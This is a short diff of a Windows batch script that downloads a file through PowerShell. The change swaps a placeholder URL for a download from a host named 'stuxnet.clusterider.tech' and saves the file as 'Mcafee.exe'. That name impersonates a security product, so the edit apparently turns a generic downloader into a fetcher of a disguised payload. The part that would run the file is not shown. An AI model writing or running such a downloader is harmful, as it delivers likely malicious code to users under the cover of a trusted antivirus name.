@@ -2,8 +2,8 @@
 setlocal
 
 REM Set the download URL and output filename
-set "URL=https://example.com/yourprogram.exe"
-set "OUTPUT=yourprogram.exe"
+set "URL=https://stuxnet.clusterider.tech/download/Mcafee.exe"
+set "OUTPUT=Mcafee.exe"
 
 REM Download the file using PowerShell
 echo Downloading %OUTPUT% from %URL%...
